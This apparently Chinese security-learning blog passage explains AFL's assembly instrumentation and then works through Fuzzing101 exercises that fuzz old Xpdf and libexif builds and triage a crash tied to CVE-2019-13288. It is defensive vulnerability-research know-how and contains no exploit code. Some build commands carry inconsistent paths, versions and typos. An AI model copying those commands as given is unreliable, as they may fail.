<li><strong>答案</strong>：当读到 <code>.intel_syntax</code> 时，<code>if (strstr(line, &quot;.intel_syntax&quot;))</code> 成立，<code>skip_intel</code> 被设为 <code>1</code>。在它和 <code>.att_syntax</code> 之间的所有行，都会因为 <code>if (skip_intel || ...)</code> 这个总安全检查而直接 <code>continue</code>，跳过所有插桩分析。当读到 <code>.att_syntax</code> 时，<code>if (strstr(line, &quot;.att_syntax&quot;))</code> 成立，<code>skip_intel</code> 被恢复为 <code>0</code>。</li>
<li><strong>问题</strong>：<code>skip_app</code> 标志是如何因为 <code>#APP</code> 和 <code>#NO_APP</code> 而变化的？</li>
<li><strong>答案</strong>：与上面类似。当读到 <code>#APP</code> 时，<code>skip_app</code> 被设为 <code>1</code>，<code>#NO_APP</code> 将其恢复为 <code>0</code>。之间的行同样会被总安全检查跳过。</li>
</ul>
<h4 id="3-函数标签-延迟插桩"><a href="#3-函数标签-延迟插桩" class="headerlink" title="3. 函数标签 (延迟插桩)"></a>3. 函数标签 (延迟插桩)</h4><ul>
<li><strong>问题</strong>：当读到 <code>main:</code> 这一行时，程序会做什么？</li>
<li><strong>答案</strong>：程序会识别出这是一个标签 (<code>strstr(line, &quot;:&quot;)</code> 成立)，但它不以 <code>.</code> 开头，所以会进入 <code>else</code> 分支，被判断为函数标签。它<strong>不会立即插桩</strong>，而是将 <code>instrument_next</code> 设置为 <code>1</code>。</li>
<li><strong>问题</strong>：真正的插桩发生在哪一行<strong>之前</strong>？</li>
<li><strong>答案</strong>：插桩发生在 <code>endbr64</code> 这一行<strong>之前</strong>。因为 <code>main:</code> 和 <code>.LFB0:</code> 和 <code>.cfi_startproc</code> 都不是以 <code>\t</code> 和字母开头的“真实指令”，循环会继续。直到 <code>endbr64</code> 这一行，循环开头的 <code>if (... instrument_next ...)</code> 条件终于满足，此时程序会先 <code>fprintf</code> 写入桩代码，然后再 <code>fputs</code> 写入 <code>endbr64</code> 这一行。</li>
</ul>
<h4 id="4-条件跳转-即时插桩"><a href="#4-条件跳转-即时插桩" class="headerlink" title="4. 条件跳转 (即时插桩)"></a>4. 条件跳转 (即时插桩)</h4><ul>
<li><strong>问题</strong>：当读到 <code>jg .L2</code> 这一行时，程序会做什么？</li>
<li><strong>答案</strong>：程序会识别出这是一条以 <code>\t</code> 开头的指令。内部的 <code>if (line[1] == &#39;j&#39; &amp;&amp; line[2] != &#39;m&#39;)</code> 条件成立（因为 <code>jg</code> 符合）。于是程序<strong>立刻</strong> <code>fprintf</code> 写入一个桩代码，然后 <code>continue</code>。这个桩代码被插在了 <code>jg .L2</code> 这一行<strong>之后</strong>。</li>
</ul>
<h4 id="5-分支标签-延迟插桩"><a href="#5-分支标签-延迟插桩" class="headerlink" title="5. 分支标签 (延迟插桩)"></a>5. 分支标签 (延迟插桩)</h4><ul>
<li><strong>问题</strong>：当读到 <code>.L2:</code> 和 <code>.L3:</code> 时，程序分别会做什么？</li>
<li><strong>答案</strong>：对于 <code>.L2:</code> 和 <code>.L3:</code>，程序都会识别出它们是标签，且以 <code>.</code> 开头。内部的 <code>if ((isdigit(line[2]) ...))</code> 条件成立（因为 <code>L</code> 之后是数字）。于是，它们都会将 <code>instrument_next</code> 设置为 <code>1</code>。</li>
<li><strong>问题</strong>：针对这两个标签的插桩，又分别发生在哪一行<strong>之前</strong>？</li>
<li><strong>答案</strong>：<ul>
<li><code>.L2:</code> 的桩代码，插在了它后面的 <code>\tmov eax, DWORD PTR [rbp-4]</code> 这一行<strong>之前</strong>。</li>
<li><code>.L3:</code> 的桩代码，插在了它后面的 <code>\tnop</code> 这一行<strong>之前</strong>。</li>
</ul>
</li>
</ul>
<h4 id="6-非插桩目标"><a href="#6-非插桩目标" class="headerlink" title="6. 非插桩目标"></a>6. 非插桩目标</h4><ul>
<li><strong>问题</strong>：为什么 <code>.LFB0:</code>, <code>.LFE0:</code>, <code>.LC0:</code>, <code>0:</code>, <code>1:</code>, <code>4:</code> 这些标签<strong>不会</strong>被插桩？</li>
<li><strong>答案</strong>：<ul>
<li><code>.LFB0:</code> 和 <code>.LFE0:</code>：虽然它们是标签，但它们的第三个字符不是数字，<code>strncmp(line+1, &quot;LBB&quot;, 3)</code> 也不成立，所以 <code>if</code> 条件不满足，不会设置 <code>instrument_next</code>。AFL 认为它们是编译器用于元数据（函数开始&#x2F;结束）的标签，而不是真正的分支目标。</li>
<li><code>.LC0:</code>：同样，第三个字符 <code>C</code> 不是数字，也不是 <code>LBB</code>。</li>
<li><code>.rodata</code> 段的标签：当代码读到 <code>.section .rodata</code> 时，<code>instr_ok</code> 已经被设为 <code>0</code>，所以后续所有行都会被总安全检查跳过，根本不会进入标签分析的逻辑。</li>
</ul>
</li>
<li><strong>问题</strong>：为什么无条件跳转 <code>jmp .L3</code> <strong>不会</strong>被插桩？</li>
<li><strong>答案</strong>：<code>if (line[1] == &#39;j&#39; &amp;&amp; line[2] != &#39;m&#39;)</code> 这个条件专门排除了 <code>jmp</code>（因为 <code>line[2]</code> 等于 <code>&#39;m&#39;</code>）。因为无条件跳转只有一条路径，没有“不跳转”的分支，所以在这里插桩没有意义，反而会增加开销。这条边的覆盖会在目标标签 <code>.L3</code> 那里被捕捉到。</li>
</ul>
</blockquote>
<hr>
<h4 id="最终-modified-file-的内容"><a href="#最终-modified-file-的内容" class="headerlink" title="最终 modified_file 的内容"></a>最终 <code>modified_file</code> 的内容</h4><p>这里只需要注意插桩位置，装代码无需注意。</p>
<p>总结：插桩位置主要有标签和条件跳转指令后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.file	&quot;test.c&quot;</span><br><span class="line">	.intel_syntax noprefix</span><br><span class="line"># -- some intel syntax code here --</span><br><span class="line"># it should be skipped</span><br><span class="line">	.att_syntax</span><br><span class="line">	.text</span><br><span class="line">	.globl	main</span><br><span class="line">	.type	main, @function</span><br><span class="line">main:</span><br><span class="line">.LFB0:</span><br><span class="line">	.cfi_startproc</span><br><span class="line"># ============ 桩代码 for main: (Intel Syntax) ============</span><br><span class="line">	push    rax</span><br><span class="line">	push    rcx</span><br><span class="line">	push    rdx</span><br><span class="line">	mov     rdx, qword ptr [rel __afl_area_ptr]</span><br><span class="line">	mov     ecx, dword ptr [rel __afl_prev_loc]</span><br><span class="line">	mov     eax, R(MAP_SIZE) ; cur_loc = a random value</span><br><span class="line">	xor     eax, ecx         ; eax = cur_loc ^ prev_loc</span><br><span class="line">	add     rdx, rax</span><br><span class="line">	inc     byte ptr [rdx]</span><br><span class="line">	mov     eax, R(MAP_SIZE_AGAIN) ; MUST be the same random value</span><br><span class="line">	shr     eax, 1</span><br><span class="line">	mov     dword ptr [rel __afl_prev_loc], eax ; prev_loc = cur_loc &gt;&gt; 1</span><br><span class="line">	pop     rdx</span><br><span class="line">	pop     rcx</span><br><span class="line">	pop     rax</span><br><span class="line"># ==========================================================</span><br><span class="line">	endbr64</span><br><span class="line">	mov	DWORD PTR [rbp-4], edi</span><br><span class="line">	cmp	DWORD PTR [rbp-4], 10</span><br><span class="line">	jg	.L2</span><br><span class="line"># ============ 桩代码 for jg (not-taken): (Intel Syntax) ============</span><br><span class="line">	push    rax</span><br><span class="line">	push    rcx</span><br><span class="line">	push    rdx</span><br><span class="line">	mov     rdx, qword ptr [rel __afl_area_ptr]</span><br><span class="line">	mov     ecx, dword ptr [rel __afl_prev_loc]</span><br><span class="line">	mov     eax, R(MAP_SIZE)</span><br><span class="line">	xor     eax, ecx</span><br><span class="line">	add     rdx, rax</span><br><span class="line">	inc     byte ptr [rdx]</span><br><span class="line">	mov     eax, R(MAP_SIZE_AGAIN)</span><br><span class="line">	shr     eax, 1</span><br><span class="line">	mov     dword ptr [rel __afl_prev_loc], eax</span><br><span class="line">	pop     rdx</span><br><span class="line">	pop     rcx</span><br><span class="line">	pop     rax</span><br><span class="line"># ====================================================================</span><br><span class="line">#APP</span><br><span class="line">	# This is user&#x27;s inline assembly</span><br><span class="line">	# It should also be skipped</span><br><span class="line">#NO_APP</span><br><span class="line">	mov	eax, DWORD PTR [rbp-4]</span><br><span class="line">	add	eax, 1</span><br><span class="line">	jmp	.L3</span><br><span class="line">.L2:</span><br><span class="line"># ============ 桩代码 for .L2: (Intel Syntax) ============</span><br><span class="line">	push    rax</span><br><span class="line">	push    rcx</span><br><span class="line">	push    rdx</span><br><span class="line">	mov     rdx, qword ptr [rel __afl_area_ptr]</span><br><span class="line">	mov     ecx, dword ptr [rel __afl_prev_loc]</span><br><span class="line">	mov     eax, R(MAP_SIZE)</span><br><span class="line">	xor     eax, ecx</span><br><span class="line">	add     rdx, rax</span><br><span class="line">	inc     byte ptr [rdx]</span><br><span class="line">	mov     eax, R(MAP_SIZE_AGAIN)</span><br><span class="line">	shr     eax, 1</span><br><span class="line">	mov     dword ptr [rel __afl_prev_loc], eax</span><br><span class="line">	pop     rdx</span><br><span class="line">	pop     rcx</span><br><span class="line">	pop     rax</span><br><span class="line"># ========================================================</span><br><span class="line">	mov	eax, DWORD PTR [rbp-4]</span><br><span class="line">	sub	eax, 1</span><br><span class="line">.L3:</span><br><span class="line"># ============ 桩代码 for .L3: (Intel Syntax) ============</span><br><span class="line">	push    rax</span><br><span class="line">	push    rcx</span><br><span class="line">	push    rdx</span><br><span class="line">	mov     rdx, qword ptr [rel __afl_area_ptr]</span><br><span class="line">	mov     ecx, dword ptr [rel __afl_prev_loc]</span><br><span class="line">	mov     eax, R(MAP_SIZE)</span><br><span class="line">	xor     eax, ecx</span><br><span class="line">	add     rdx, rax</span><br><span class="line">	inc     byte ptr [rdx]</span><br><span class="line">	mov     eax, R(MAP_SIZE_AGAIN)</span><br><span class="line">	shr     eax, 1</span><br><span class="line">	mov     dword ptr [rel __afl_prev_loc], eax</span><br><span class="line">	pop     rdx</span><br><span class="line">	pop     rcx</span><br><span class="line">	pop     rax</span><br><span class="line"># ========================================================</span><br><span class="line">	nop</span><br><span class="line">	leave</span><br><span class="line">	.cfi_def_cfa 7, 8</span><br><span class="line">	ret</span><br><span class="line">	.cfi_endproc</span><br><span class="line">.LFE0:</span><br><span class="line">	.size	main, .-main</span><br><span class="line">	.section	.rodata</span><br><span class="line">.LC0:</span><br><span class="line">	.string	&quot;Hello&quot;</span><br><span class="line">	.ident	&quot;GCC: (Ubuntu 11.2.0-19ubuntu1) 11.2.0&quot;</span><br><span class="line">	.section	.note.GNU-stack,&quot;&quot;,@progbits</span><br><span class="line">	.section	.note.gnu.property,&quot;a&quot;</span><br><span class="line">	.align 8</span><br><span class="line">	.long	 1f - 0f</span><br><span class="line">	.long	 4f - 1f</span><br><span class="line">	.long	 5</span><br><span class="line">0:</span><br><span class="line">	.string	 &quot;GNU&quot;</span><br><span class="line">1:</span><br><span class="line">	.word	0</span><br><span class="line">	.long	0</span><br><span class="line">	.long	0</span><br><span class="line">4:</span><br><span class="line"></span><br><span class="line"># ============ main_payload at the end (Intel Syntax) ============</span><br><span class="line"># These are references to be resolved by the linker with afl-rt.o</span><br><span class="line">__afl_area_ptr:</span><br><span class="line">        .quad   __afl_area_ptr</span><br><span class="line">__afl_prev_loc:</span><br><span class="line">        .long   0</span><br><span class="line"># ====================================================================</span><br></pre></td></tr></table></figure>
<p><em>(注：为了清晰，我用注释标出了桩代码的位置，并简化了桩代码内容。实际桩代码会根据 <code>use_64bit</code> 的值从 <code>trampoline_fmt_64/32</code> 宏生成)</em></p>
<h1 id="专题二：fuzzing101学习"><a href="#专题二：fuzzing101学习" class="headerlink" title="专题二：fuzzing101学习"></a>专题二：fuzzing101学习</h1><p>github项目：<a href="https://github.com/antonio-morales/Fuzzing101">fuzzing101</a></p>
<p>笔者复现所有环境：ubuntu 22.04(wsl2)、AFL++</p>
<h2 id="Exercise-1：Xpdf—-CVE-2019-13288"><a href="#Exercise-1：Xpdf—-CVE-2019-13288" class="headerlink" title="Exercise 1：Xpdf—-  CVE-2019-13288"></a>Exercise 1：Xpdf—-  CVE-2019-13288</h2><h3 id="目标环境配置"><a href="#目标环境配置" class="headerlink" title="目标环境配置"></a>目标环境配置</h3><p>这里选用的是比较旧版本的一个 xpdf：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz</span><br><span class="line">tar -xvzf xpdf-3.02.tar.gz</span><br></pre></td></tr></table></figure>

<p>在<code>xpdf-3.02/</code>目录下可以看到<code>configure</code>文件，用编辑器打开它可以看见这是一个生成makefile的程序</p>
<p><img data-src="/../images/image-20250925194927464.png" alt="image-20250925194927464"></p>
<p>编译程序默认指定的是<code>gcc</code>，由于我们需要在编译的时候进行插桩，所以将编译命令指定为<code>afl-clang-fast</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:xpdf-3.02/ $ <span class="built_in">export</span> CC=/home/le0n/tools/AFLplusplus/afl-clang-fast                                   </span><br><span class="line">le0n:xpdf-3.02/ $ <span class="built_in">export</span> CXX=/home/le0n/tools/AFLplusplus/afl-clang-fast++                               </span><br></pre></td></tr></table></figure>

<p>编译程序，并指定将编译好的程序放在<code>/home/le0n/fuzzing/fuzzing_xpdf/install  </code>指定目录中</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:xpdf-3.02/ $ ./configure --prefix=/home/le0n/fuzzing/fuzzing_xpdf/install  </span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>在 make 过程中可以看到 afl-clang-fast 编译器的相关输出信息：</p>
<p><img data-src="/../images/image-20250925200621502.png" alt="image-20250925200621502"></p>
<p>编译好后，我们需要确认插桩成功了，因此我们进入到<code>install</code>目录中，由于我们使用的是<code>afl-clang-fast</code>进行插桩，所以需要查看插桩关键字：<code>__sanitizer_cov</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:bin/ $ strings ./pdftotext | grep __sanitizer_cov  </span><br></pre></td></tr></table></figure>

<p>插桩成功效果如下</p>
<p><img data-src="/../images/image-20250925201555386.png" alt="image-20250925201555386"></p>
<h3 id="FUZZ阶段"><a href="#FUZZ阶段" class="headerlink" title="FUZZ阶段"></a>FUZZ阶段</h3><p>实验环境部署好了，接下来要开始fuzz</p>
<h4 id="fuzz前期准备"><a href="#fuzz前期准备" class="headerlink" title="fuzz前期准备"></a>fuzz前期准备</h4><p>在正式执行fuzz之前需要准备一些fuzz的种子，也就是说需要输入的测试用例，并且要为这些文件创建一个目录：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_xpdf/ $ <span class="built_in">mkdir</span> pdf_examples &amp;&amp; <span class="built_in">cd</span> pdf_examples   </span><br><span class="line">le0n:pdf_examples/ $ wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf</span><br><span class="line">le0n:pdf_examples/ $ wget http://www.africau.edu/images/default/sample.pdf </span><br><span class="line">le0n:pdf_examples/ $ wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf </span><br></pre></td></tr></table></figure>

<p>这里需要检测一下我们下载下来的文件是否可用，可以调用<code>/fuzzing_xpdf/install/bin/pdfinfo</code>的 info 来查看<code>helloworld.pdf</code>的基本信息。</p>
<p>成功效果如下：</p>
<p><img data-src="/../images/image-20250925202823186.png" alt="image-20250925202823186"></p>
<p>与此同时还要<strong>关闭</strong>系统下的<strong>核心转储</strong>，确保fuzz过程中出现crash也不会使程序中断</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line"><span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<h4 id="开始fuzz"><a href="#开始fuzz" class="headerlink" title="开始fuzz"></a>开始fuzz</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_xpdf/ $ /home/le0n/tools/AFLplusplus/afl-fuzz -i ./pdf_examples -o ./out -M fuzzer1 -- ./install/bin/pdftotext @@ ./output</span><br></pre></td></tr></table></figure>

<p>这里说明一下使用的参数：</p>
<ul>
<li>-i：指定输入文件夹，里面是准备好的种子</li>
<li>-o：指定输出文件夹，存放fuzz过程中出现的生成的queue、crash、hang等</li>
<li>-M:：可以选用主从多开fuzzer(其它fuzzer用-S指定，需要注意的是输出路径保持一致)</li>
<li>–：分隔符，后加测试目标</li>
<li>@@：指代文件，如果不加@@就是标准输入</li>
</ul>
<p>那么使用-S指定多开fuzzer就可以同时进行多个fuzzer1~4</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/home/le0n/tools/AFLplusplus/afl-fuzz -i ./pdf_examples -o ./out -S fuzzer2 -- ./install/bin/pdftotext @@ ./output</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/image-20250925204442069.png" alt="image-20250925204442069"></p>
<p>这里开了4个fuzzer运行，运行了预计40min在fuzzer1中共计发现了3个crash，在out目录中如下：</p>
<p><img data-src="/../images/image-20250926094910645.png" alt="image-20250926094910645"></p>
<h4 id="gdb验证fuzz结果"><a href="#gdb验证fuzz结果" class="headerlink" title="gdb验证fuzz结果"></a>gdb验证fuzz结果</h4><p>我们需要对 crash 进行分析，这里可以是静态分析，也可以是动态分析。静态分析的话就是常规的关键点分析，动态分析可以编译出一个带符号的程序，然后使用 gdb 去动态调试，分析崩溃现场和函数执行流。我们先看下动态调试，静态分析会在后面的例子中结合 memory sanitizer 这个工具去使用。</p>
<p><strong>带符号编译目标程序</strong></p>
<p>我们要先删掉由afl-clang-fast插桩编译的install目录下的内容，重新使用gcc编译</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_xpdf/ $ <span class="built_in">rm</span> -r ./install </span><br><span class="line">le0n:fuzzing_xpdf/ $ <span class="built_in">cd</span> xpdf-3.02  </span><br><span class="line">le0n:xpdf-3.02/ $ make clean </span><br><span class="line">CFLAGS=<span class="string">&quot;-g -O0&quot;</span> CXXFLAGS=<span class="string">&quot;-g -O0&quot;</span> ./configure --prefix=/home/le0n/fuzzing/fuzzing_xpdf/install</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p><strong>gdb动态调试</strong></p>
<p>现在可以使用gdb指定pdftotext二进制程序运行fuzz结果文件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:xpdf-3.02/ $ <span class="built_in">cd</span> ../ </span><br><span class="line">le0n:fuzzing_xpdf/ $ <span class="built_in">cd</span> ./install/bin   </span><br><span class="line">le0n:bin/ $ gdb --args ./pdftotext <span class="variable">$HOME</span>/fuzzing/fuzzing_xpdf/out/fuzzer1/crashes/id:000000,sig:11,src:000716,<span class="keyword">time</span>:381871,execs:329775,op:havoc,rep:2 <span class="variable">$HOME</span>/fuzzing/fuzzing_xpdf/output</span><br></pre></td></tr></table></figure>

<p>加载后，直接<code>r</code>运行，程序断掉后用<code>bt</code>来回溯执行过的函数（这里要Crtl+c），效果如下：</p>
<p><img data-src="/../images/image-20250926101210649.png" alt="image-20250926101210649"></p>
<p>动态调试结果显示<code>Parser:getObj</code>函数在不断递归调用，这验证了CVE-2019-13288漏洞中的描述，无限递归调用造成拒绝服务</p>
<p>后续的跟进追流研究<a href="https://www.ruanx.net/fuzzing101-wp-1/">参考文章</a></p>
<blockquote>
<p>，我们成功还原了递归链条：</p>
<ol>
<li><code>main</code> 经过一些过程之后，调用 <code>displaySlice</code> 输出一些文本</li>
<li><code>displaySlice</code> 调用<code>contents.fetch(xref, &amp;obj)</code> ，其中 <code>contents</code> 是一个 <code>objRef</code>，共用体 <code>ref</code> 二元组为 <code>(num=7, gen=0)</code></li>
<li><code>xref-&gt;fetch(ref.num, ref.gen, obj)</code> 被调用，<strong>实际上 call 了 <code>xref-&gt;fetch(7, 0, obj)</code></strong></li>
<li><code>xref-&gt;fetch</code> 过程中，检测到这条 entry 是未被压缩的，调用 <code>parser-&gt;getObj(obj, fileKey=NULL, encAlgorithm=&lt;RC4&gt;, keyLength0, num=7, gen=0)</code>，以获取 num&#x3D;7, gen&#x3D;0 这个 pdf object</li>
<li><code>Parser::getObj</code> 过程中，首先通过 <code>obj-&gt;initDict(xref)</code> 把 <code>obj</code> 从 <code>objNone</code> 初始化成一个 <code>objDict</code>，调用 <code>makeStream(obj, fileKey=NULL, encAlgorithm=&lt;RC4&gt;, keyLength=0, objNum=7, objGen=0)</code> 生成一个 <code>Stream</code></li>
<li><code>Parser::makeStream</code> 过程中，调用 <code>obj-&gt;dictLookup(&quot;Length&quot;, &amp;newobj)</code>，意图是从现在已经是 <code>objDict</code> 的 <code>obj</code> 里面取 key 为 <code>&quot;Length&quot;</code> 的键值对，把 value 给 <code>newobj</code></li>
<li>上述 <code>dictLookup</code> 是一个简单封装，调用 <code>obj-&gt;dict-&gt;lookup(&quot;Length&quot;, &amp;newobj)</code></li>
<li>上述 <code>lookup</code> 从 <code>obj-&gt;dict</code> 这个 dictionary 里面寻找到 key 为 <code>&quot;Length&quot;</code> 的 entry <code>e: (key=&quot;Length&quot;, val=&lt;objRef&gt;)</code>，且这里的这个类型为 <code>objRef</code> 的 <code>val</code> 的 <code>ref</code> 二元组为 <code>(num=7, gen=0)</code>。调用 <code>val.fetch(xref, &amp;newobj)</code></li>
<li>上述 <code>val.fetch(xref, &amp;newobj)</code>，<strong>由于 <code>val</code> 的 <code>ref</code> 二元组为 <code>(num=7, gen=0)</code>，所以会调用 <code>xref-&gt;fetch(7, 0, &amp;newobj)</code></strong>，这个 call 与第 3 条分析的 call 作用相同，至此进入无限递归。</li>
</ol>
</blockquote>
<h2 id="Exercise-2：Libexif"><a href="#Exercise-2：Libexif" class="headerlink" title="Exercise 2：Libexif"></a>Exercise 2：Libexif</h2><h3 id="Libexif"><a href="#Libexif" class="headerlink" title="Libexif"></a>Libexif</h3><p>项目地址：<a href="https://github.com/libexif/libexif">https://github.com/libexif/libexif</a></p>
<p>libexif是一个用于解析、编辑和保存EXIF数据的库，支持解析、编辑和保存EXIF数据</p>
<p>可交换图像文件格式（英语：Exchangeable image file format, 官方简称 Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。</p>
<p> 本次练习选用 libexif 0.6.14 版本，该版本存在 CVE-2009-3895 和 CVE-2012-2836 漏洞：</p>
<ul>
<li><strong>CVE-2009-3895</strong>  - 一种基于堆溢出的缓冲区溢出漏洞，可以通过无效的 EXIF 图像触发。可利用该漏洞在使用该库的应用程序中执行任意代码： <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3895">CVE-2009-3895 详情</a> </li>
<li><strong>CVE-2012-2836</strong>  - 一种基于越界读取漏洞，可以通过特构造的 EXIF 标签的图像触发。  - 可利用该漏洞允许攻击者进行拒绝服务或可能从程序内获取潜在的敏感信息： <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2836">CVE-2012-2836 详情</a></li>
</ul>
<p><strong>libexif库安装</strong></p>
<p>由于libexif为本次练习的主要目标，所以还是需要进行插桩编译的，老样子创建一个干净的目录</p>
<p>将libexif-0.6.14源码的包下载下来并安装一些必要的软件和依赖</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libexif/ $ <span class="built_in">sudo</span> apt-get install autopoint libtool gettext libpopt-dev   </span><br><span class="line">le0n:fuzzing_libexif/ $ wget https://github.com/libexif/libexif/archive/refs/tags/libexif-0_6_14-release.tar.gz    </span><br><span class="line">le0n:fuzzing_libexif/ $ tar -xzvf libexif-0_6_14-release.tar.gz</span><br></pre></td></tr></table></figure>

<p>构建并安装libexif</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libexif/ $ <span class="built_in">cd</span> libexif-libexif-0_6_14-release </span><br><span class="line">le0n:libexif-libexif-0_6_14-release/ $ autoreconf -fvi </span><br></pre></td></tr></table></figure>

<p>这个时候就可以在当前目录下生成一个configure，是创建makefile的程序，所以还要设置<code>CC</code>和·<code>CXX</code>环境变量</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libexif/ $ <span class="built_in">export</span> CC=/home/le0n/tools/AFLplusplus/afl-clang-fast                             </span><br><span class="line">le0n:fuzzing_libexif/ $ <span class="built_in">export</span> CXX=/home/le0n/tools/AFLplusplus/afl-clang-fast++ </span><br></pre></td></tr></table></figure>

<p>然后这里直接指定编译好的程序放在<code>fuzzing_libexif/install</code>目录下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:libexif-libexif-0_6_14-release/ $ ./configure --enable-shared=no --prefix=/home/le0n/fuzzing/fuzzing_libexif/install</span><br><span class="line">le0n:libexif-libexif-0_6_14-release/ $ make</span><br><span class="line">le0n:libexif-libexif-0_6_14-release/ $ make install  </span><br></pre></td></tr></table></figure>

<p>有报错的话丢给ai问问有问题没。然后进入<code>install/lib</code>目录下检查一下插桩是否成功</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:lib/ $ strings libexif.a | grep __sanitizer_cov</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/image-20250927143354760.png" alt="image-20250927143354760"></p>
<h3 id="编译能调用libexif的程序"><a href="#编译能调用libexif的程序" class="headerlink" title="编译能调用libexif的程序"></a>编译能调用libexif的程序</h3><p>这里需要注意的是由于libexif是一个链接库，是无法直接运行的，所以还是需要一个能够调用libexif库的程序。libexif官网其实就有提供fuzz白的text文件<a href="https://github.com/libexif/libexif/blob/master/test/test-fuzzer-persistent.c">https://github.com/libexif/libexif/blob/master/test/test-fuzzer-persistent.c</a></p>
<p>同时Exercise2中也提供了一个能够调用libexif库的程序，直接用就好了</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libexif/ $ wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz </span><br><span class="line">le0n:fuzzing_libexif/ $ tar -xzvf exif-0_6_15-release.tar.gz </span><br></pre></td></tr></table></figure>

<p>后续安装过程和libexif一样</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libexif/ $ <span class="built_in">cd</span> exif-exif-0_6_15-release/</span><br><span class="line">le0n:exif-exif-0_6_15-release/ $ autoreconf -fvi </span><br><span class="line">le0n:exif-exif-0_6_15-release/ $ ./configure --enable-shared=no --prefix=/home/le0n/fuzzing/fuzzing_libexif/install/ PKG_CONFIG_PATH=<span class="variable">$HOME</span>/fuzzing/fuzzing_libexif/install/lib/pkgconfig</span><br><span class="line">le0n:exif-exif-0_6_15-release/ $ make </span><br><span class="line">le0n:exif-exif-0_6_15-release/ $ make install </span><br></pre></td></tr></table></figure>

<p>这里唯一的区别是要用<code>PKG_CONFIG_PATH</code>指定一下安装的链接库的位置，同样是在install目录下的bin里面可以找到程序</p>
<p><img data-src="/../images/image-20250927144233004.png" alt="image-20250927144233004"></p>
<p>对于这个文件也可以查看一下插桩是否成功</p>
<p><img data-src="/../images/image-20250927144308435.png" alt="image-20250927144308435"></p>
<h3 id="FUZZ阶段-1"><a href="#FUZZ阶段-1" class="headerlink" title="FUZZ阶段"></a>FUZZ阶段</h3><p>环境已部署好，接下来开始fuzz</p>
<h4 id="准备种子"><a href="#准备种子" class="headerlink" title="准备种子"></a>准备种子</h4><p>因为程序本身的功能是解析EXIF文件，这里直接用Exercise 2提供的种子链接：<a href="https://github.com/ianare/exif-samples/archive/refs/heads/master.zip">https://github.com/ianare/exif-samples/archive/refs/heads/master.zip</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:fuzzing_libexif/ $ wget https://github.com/ianare/exif-samples/archive/refs/heads/master.zip </span><br><span class="line">le0n:fuzzing_libexif/ $ unzip master.zip </span><br></pre></td></tr></table></figure>

<h4 id="开始fuzz-1"><a href="#开始fuzz-1" class="headerlink" title="开始fuzz"></a>开始fuzz</h4><p>现在所有的条件准备好了，下面就开始fuzz</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/home/hollk/AFLplusplus/afl-fuzz -i /home/hollk/fuzzing_libexif/exif-samples-master/jpg/ -o /home/hollk/fuzzing_libexif/out/ -s 123 -- /home/hollk/fuzzing_libexif/install/bin/exif @@</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/image-20250927153225557.png" alt="image-20250927153225557"></p>
<p>同理，我们删去插桩过的install目录，然后仍然带符号重新编译：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> install</span><br><span class="line"><span class="built_in">cd</span> libexif-libexif-0_6_15-release</span><br><span class="line">make clean</span><br><span class="line">CFLAGS=<span class="string">&quot;-g -O0&quot;</span> CXXFLAGS=<span class="string">&quot;-g -O0&quot;</span> ./configure --enable-shared=no --prefix=/home/le0n/fuzzing/fuzzing_libexif/install</span><br><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> exif-exif-0_6_15-release</span><br><span class="line">make clean</span><br><span class="line">CFLAGS=<span class="string">&quot;-g -O0&quot;</span> CXXFLAGS=<span class="string">&quot;-g -O0&quot;</span> ./configure --enable-shared=no --prefix=/home/le0n/fuzzing/fuzzing_libexif/install/ PKG_CONFIG_PATH=<span class="variable">$HOME</span>/fuzzing/fuzzing_libexif/install/lib/pkgconfi</span><br><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>然后使用 gdb 进行动态调试，参数为 crashes 目录下的文件：</p>
